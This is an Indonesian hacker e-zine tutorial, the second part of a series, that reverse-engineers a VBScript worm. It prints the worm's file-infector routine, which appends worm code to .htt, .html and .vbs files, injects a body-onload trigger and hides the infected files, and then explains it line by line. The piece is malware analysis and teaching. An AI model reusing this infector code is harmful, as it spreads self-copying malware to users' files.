@@ -1,0 +1,156 @@
+
+        ____________________   ___ ___ ________
+	\_   _____/\_   ___ \ /   |   \\_____  \
+	 |    __)_ /    \  \//    ~    \/   |   \
+	 |        \\     \___\    Y    /    |    \
+	/_______  / \______  /\___|_  /\_______  /
+	        \/         \/       \/         \/
+
+
+					    .OR.ID
+ECHO-ZINE RELEASE
+       07
+
+Author: knot |syuhada@antizionist.cjb.net
+Online @ www.echo.or.id :: http://ezine.echo.or.id
+
+
+== SECTION II ==
+
+
+hai selamat datang di tutorial ke2 saya. melanjutkan tulisan saya yang 
+pertama, dalam tulisan ini saya masih akan berusaha menjelaskan tentang 
+vbsworm. setelah pada tutorial pertama saya yang telah menjelaskan  
+tentang bagaimana membalik alur deskripsi worm yang terenkripsi untuk
+mendapatkan full source code.
+
+tekhnik2 yang saya gunakan dalam menyingkap source code vbsworm secara 
+logika dapat diterapkan ke semua worm vbs yang terenkripsi karena kesemuanya 
+mengandung logika yang sama. maka untuk itulah saya sangat menganjurkan 
+kepada anda untuk mencoba mengerti baris demi baris, kode demi kode yang 
+telah anda tulis ke dalam worm.
+
+dalam tutor ini saya akan membahas fungsi KLAppendTo() yang merupakan bagian 
+pertama dalam worm 
+yang telah saya bahas terdahulu. 
+
+------- start code -----
+
+[Function KLAppendTo()]
+
+--------
+Function KJAppendTo(FilePath,TypeStr)
+On Error Resume Next
+Set ReadTemp = FSO.OpenTextFile(FilePath,1)
+TmpStr = ReadTemp.ReadAll
+If Instr(TmpStr,"KJ_start()") <> 0 Or Len(TmpStr) < 1 Then
+ReadTemp.Close
+Exit Function
+End If
+If TypeStr = "htt" Then
+ReadTemp.Close
+Set FileTemp = FSO.OpenTextFile(FilePath,2)
+FileTemp.Write "<" & "BODY onload=""" & "vbscript:" & "KJ_start()""" & ">" & vbCrLf & TmpStr & vbCrLf & HtmlText
+FileTemp.Close
+Set FAttrib = FSO.GetFile(FilePath)
+FAttrib.attributes = 34
+Else
+ReadTemp.Close
+Set FileTemp = FSO.OpenTextFile(FilePath,8)
+If TypeStr = "html" Then
+FileTemp.Write vbCrLf & "<" & "HTML>" & vbCrLf & "<" & "BODY onload=""" & "vbscript:" & "KJ_start()""" & ">" & vbCrLf & HtmlText
+ElseIf TypeStr = "vbs" Then
+FileTemp.Write vbCrLf & VbsText
+End If
+FileTemp.Close
+End If
+End Function
+-------
+
+saya menyebut ini sebagai "Main Infector" knapa? karena fungsi ini bertanggung 
+jawab atas tingkah worm yang paling menyebalkan, mengkopi dirinya. 
+fungsi ini akan menginfeksi file2 dengan ekstension .htt .html .vbs sekaligus 
+menset attribut nya.
+
+plus pada file html menambahkan rutin pengaktifan dalam tag html. <body onload>
+
+-------
+
+Function KJAppendTo(FilePath,TypeStr) <- menyatakan fungsi yang menerima
+					 input berupa variabel FilePath 
+					 dan TypeStr.
+
+On Error Resume Next			<- Save Point
+				
+Set ReadTemp = FSO.OpenTextFile(FilePath,1) <- Baca file 
+
+TmpStr = ReadTemp.ReadAll		<- mengisi variabel TmpStr dengan
+					   isi dari file Readtemp.
+					
+If Instr(TmpStr,"KJ_start()") <> 0 Or Len(TmpStr) < 1 Then 	
+					<- baris ini berisi perintah untuk
+					   memanggil fungsi Instr() yang
+					   bertujuan mengidentifikasi file
+					   readTemp adalah worm atau bkn.
+
+	ReadTemp.Close			<- kalau worm, tutup file.
+	
+	Exit Function			<- keluar dari fungsi.
+End If
+
+If TypeStr = "htt" Then			<- jika ekstensinya .htt maka..
+	
+ReadTemp.Close				<- tutup file
+						
+Set FileTemp = FSO.OpenTextFile(FilePath,2) <- buka kembali dengan mode
+						tulis.
+
+FileTemp.Write "<" & "BODY onload=""" & "vbscript:" & "KJ_start()""" & ">" & vbCrLf & TmpStr & vbCrLf & HtmlText
+					<- menulis FileTemp. 
+
+FileTemp.Close				<- selesai tulis.. tutup file
+
+Set FAttrib = FSO.GetFile(FilePath)	<- rubah attribut file (hidden atau read only ,maybe)
+FAttrib.attributes = 34
+
+Else					<- buat file selain .htt
+
+ReadTemp.Close				<- tutup readtemp.
+
+Set FileTemp = FSO.OpenTextFile(FilePath,8) <- buka file dengan mode 8? (is anyone can explain thiz?)
+
+If TypeStr = "html" Then		<- kalo .html
+
+FileTemp.Write vbCrLf & "<" & "HTML>" & vbCrLf & "<" & "BODY onload=""" & "vbscript:" & "KJ_start()""" & ">" & vbCrLf & HtmlText
+					<- tulis lah.. virusnya. Variabel Htmltext berisi
+					   kode worm dalam format penginfeksi html. will
+					   explained later.
+
+ElseIf TypeStr = "vbs" Then		<- kalo .vbs
+
+FileTemp.Write vbCrLf & VbsText		<- tulis lagi virusnya, kalau sudah selesai tutup deh.
+End If
+FileTemp.Close
+End If
+
+End Function				<- akhir fungsi.
+
+
+demikian pembahasan baris per baris rutin ini, sebenarnya tidak ada yang istimewa dari rutin ini.
+sama saja seperti rutin2 penginfeksi dari worm2 vbs lain. tapi ini hanya sebagian dari keseluru
+han program worm yang saya janjikan untuk dibahas. 
+
+mengenai tingkah laku dari worm dalam bagian ini, dapat kita lihat bahwa fungsi ini hanya merupa
+kan bagian dari sub routine yang lebih kompleks. fungsi ini mengolah input file dan menginfeksi
+nya. 
+
+lebih lanjut kita akan membahas lebih dalam mengenai struktur worm ini. 
+
+
+cya
+
+----
+
+syuhada@antizionist.cjb.net
+
+----------
